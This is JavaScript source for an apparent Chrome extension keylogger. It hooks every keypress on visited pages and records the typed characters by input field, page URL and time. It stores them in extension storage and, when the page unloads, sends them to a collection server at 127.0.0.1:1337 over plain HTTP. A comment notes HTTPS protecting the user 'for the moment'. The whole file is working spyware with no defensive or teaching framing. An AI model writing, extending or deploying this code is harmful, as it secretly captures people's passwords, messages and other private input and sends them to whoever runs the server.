
//
// CONFIG
//
var MinSendGap = 10000;	//ms
//
// / CONFIG
//

var datas 		= {};
var loadingTime	= new Date().getTime();
var tabDataKey 	= '[' + document.title + ']::[' + document.URL + ']::[' + loadingTime + ']';
var isHttps		= (document.URL.substring(0,5) === 'https');

var URLorigin 	= document.URL.match(/^[\w-]+:\/*\[?([\w\.:-]+)\]?(?::\d+)?/)[0];

console.log('[+] -> ' + tabDataKey);

document.addEventListener('keypress', function (e)
{
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode)
        console.log('[+] : document : keypress event called : [' + String.fromCharCode(charCode) + '] from [' + document.activeElement.id + ']');
	if (datas[document.activeElement.id] == undefined)
		datas[document.activeElement.id] = '';
	datas[document.activeElement.id] += String.fromCharCode(charCode);
});

function 	SendDatasToServer(dataToSend)
{
	if (!isHttps)
	{
		console.log('[+] : Send recorded stuff');
		var toSendDatas = 'http://127.0.0.1:1337?G_CKL_datas=' + encodeURIComponent(JSON.stringify(dataToSend));
		console.log('[DEBUG] : To send datas : [' + toSendDatas + ']');
		
		var xhr = new XMLHttpRequest();
		xhr.open("GET", toSendDatas, true);
		xhr.onreadystatechange = function() {
		  if (xhr.readyState == 4) {
			console.log('[+] : Sent done');
		  }
		  else console.log('[+] : Sent failed');
		}
		xhr.send();
	}
	else
		console.log('[+] : Cannot send, https protect the user ... for the moment !');
}

function 	CleanCache()
{
	chrome.storage.local.remove('G_CKL', function() {
		console.log('[+] cache deleted');
	});
}
function	UpdateCache()
{
	console.log('[+] Updating the cache');

	chrome.storage.local.get('G_CKL', function(items)
	{
		var to_log = {
			'G_CKL' : {
				'lastSend' 	: new Date().getTime(),
				'content' 	: {}
			}
		};
		
		if (items.length == 0 || items['G_CKL'] == undefined || items['G_CKL']['content'] == undefined)		// cache does not exists yet
		{
			console.log('-> Creating cache');
			to_log['G_CKL']['content'] = {};
			to_log['G_CKL']['content'][URLorigin] = {};														// Create cache for the current domain
			to_log['G_CKL']['content'][URLorigin][document.URL] = {};										// Create cache for the current page
		}
		else																								// Cache already exists
		{
			console.log('-> Updating cache');
			to_log['G_CKL']['lastSend']	= items['G_CKL']['lastSend'];										// Keep existing datas into the cache
			to_log['G_CKL']['content'] 	= items['G_CKL']['content'];										// 
			if (to_log['G_CKL']['content'][URLorigin] == undefined)
				to_log['G_CKL']['content'][URLorigin] = {};
			if (to_log['G_CKL']['content'][URLorigin][document.URL] == undefined)
				to_log['G_CKL']['content'][URLorigin][document.URL] = {}; 									// Update cache for the current page
		}
		
		to_log['G_CKL']['content'][URLorigin][document.URL][loadingTime] = datas;							// Insert new datas
		
		chrome.storage.local.set(to_log, function() {
			console.log('[+] Datas saved to cache');
			console.log('[Dump] : ' + JSON.stringify(to_log));
		});
	});
}
function 	StoreDatasToCache()
{
	chrome.storage.local.get('G_CKL', function(items)
	{
		console.log('[+] StoreDatasToCache : called');
	
		if (items.length == 0 || items['G_CKL'] == undefined || items['G_CKL']['content'] == undefined)
		{
			UpdateCache(); // '_InitialData_'
			return;
		}

		if (items['G_CKL']['lastSend'] + MinSendGap < new Date().getTime())								// Datas exist, and need to be send
		{
			console.log("[+] Time to update ! :" + ((items['G_CKL']['lastSend'] + MinSendGap) - new Date().getTime()));
			if (isHttps)																				// We cannot send datas, so we store them
			{
				console.log('[+] Cannot send datas, update the cache');
				UpdateCache(); // '_HttpsUpdate_'
			}
			else
			{
				console.log('[+] send datas');
				SendDatasToServer(items['G_CKL']['content']);
				CleanCache();
			}
		}
		else																							// Too early to send, just update
		{
			UpdateCache(); // '_TooEarlyUpdate_'
		}
	});
}

window.onbeforeunload = function() {

	StoreDatasToCache();
}

